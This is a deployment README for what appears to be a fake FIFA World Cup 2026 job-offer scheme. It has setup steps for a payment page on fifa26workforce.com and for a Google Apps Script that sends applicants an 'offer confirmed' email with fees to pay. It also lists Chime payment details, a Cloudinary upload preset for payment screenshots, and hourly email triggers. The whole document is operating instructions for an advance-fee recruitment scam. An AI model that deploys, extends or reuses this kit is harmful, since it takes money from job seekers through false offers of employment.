# Partner full package — FIFA World Cup 2026 payment + Email 2

**Package version:** `2026-06-12-complete`

Replace **everything** in your partner repo / Netlify site with the files in this folder. Do not keep old copies of `1.html`, `2.css`, `3.js`, or `payment.html` — they are obsolete.

---

## File list (use ONLY these)

| File | Purpose |
|------|---------|
| `index.html` | Payment page (root of site) |
| `payment.js` | Payment logic, Chime, Cloudinary upload |
| `payment.css` | All styles (mobile-friendly) |
| `netlify.toml` | Netlify publish config |
| `Apps Script.js` | **Google Apps Script** — Email 2 (paste into Code.gs, not Netlify) |

**No `images/` folder required** — Chime and card logos are embedded inline in `index.html` (see comment `payment-assets-inline-v3`).

---

## Part 1 — Payment site (Netlify: `fifa26workforce.com`)

### Deploy

1. Delete all old files in your GitHub repo (or local folder) except `.git`.
2. Copy this entire `partner-amala` folder contents to the repo root.
3. Push to GitHub **or** drag the folder onto Netlify Deploys.
4. Netlify → Domain management → confirm `fifa26workforce.com` is attached.

### Config in `payment.js` (already set)

```javascript
chimePhoneNumber: "+1 (513) 628-6294"
chimePaymentEmail: "payment@fifa26workforce.com"
cloudinaryCloudName: "dibwotfd5"
cloudinaryUploadPreset: "payment-screenshot"
```

### Test payment page

Open a link from Email 2, or test URL with payload from careers site. Page should show fees, Chime phone + email, and upload form.

---

## Part 2 — Email 2 (Google Apps Script)

**This is separate from Netlify.** The careers site POSTs applicant data to your `/exec` URL after Email 1.

### Deploy (full replace — do not merge)

1. Open [Google Apps Script](https://script.google.com) — the project for your `/exec` URL.
2. Open **Code.gs**.
3. **Select all → Delete** (entire old script).
4. Open `Apps Script.js` from this package → copy **the entire file**.
5. Paste into Code.gs → **Save**.
6. **Deploy** → **Manage deployments** → pencil icon → **New version** → **Deploy**.
7. Keep the **same** Web app URL (do not create a new deployment unless careers site updates `VITE_FOLLOWUP_SCRIPT_URL`).

### Verify

1. Run function **`testSetup`** in the Apps Script editor.
2. Execution log must show:
   - `Script version: 2026-06-12-complete`
   - `Payment URL must be fifa26workforce.com: https://fifa26workforce.com/?d=...`
3. After 5 minutes (test delay), check inbox for Email 2 with:
   - Venue **Check-In Pass** card
   - Chime phone + `payment@fifa26workforce.com`
   - Button → `fifa26workforce.com`

### Time-driven trigger

Apps Script → **Triggers** → Add:

- Function: `sendDueFollowUpEmails`
- Event: Time-driven → Hour timer → Every hour

### Production delay

In `Apps Script.js`, change:

```javascript
const FOLLOWUP_DELAY_MS = 4 * 60 * 60 * 1000; // 4 hours
```

Deploy **new version** again.

---

## Part 3 — Careers site connection (your friend’s site)

The careers site must POST to **your** Apps Script `/exec` URL. Your friend sets:

```
VITE_FOLLOWUP_SCRIPT_URL=https://script.google.com/macros/s/YOUR_DEPLOYMENT_ID/exec
VITE_PAYMENT_PAGE_URL=https://fifa26workforce.com
```

Do **not** change your `/exec` URL unless you tell them to update `VITE_FOLLOWUP_SCRIPT_URL`.

---

## What Email 2 includes (after correct deploy)

- Subject: “Your FIFA World Cup 2026 offer — next steps”
- “Your offer has been confirmed”
- **Venue Check-In Pass** (screenshot card with name + APP-ID)
- Reporting date, time, venue
- Fee breakdown from careers site POST
- Chime: phone + `payment@fifa26workforce.com`
- Payment button → `fifa26workforce.com/?d=...`

---

## Troubleshooting

| Problem | Fix |
|---------|-----|
| Email 2 still old design | Apps Script not fully replaced — delete ALL code, paste full `Apps Script.js`, new version deploy |
| Payment link goes to Netlify | Old script — redeploy `Apps Script.js` (uses `fifa26workforce.com` only) |
| Screenshot upload fails | Cloudinary preset `payment_screenshot` on cloud `dibwotfd5`, unsigned |
| No Email 2 at all | Check trigger `sendDueFollowUpEmails` runs hourly; check Executions for errors |

---

## Support contacts

- Payment email: `payment@fifa26workforce.com`
- Chime: `+1 (513) 628-6294`
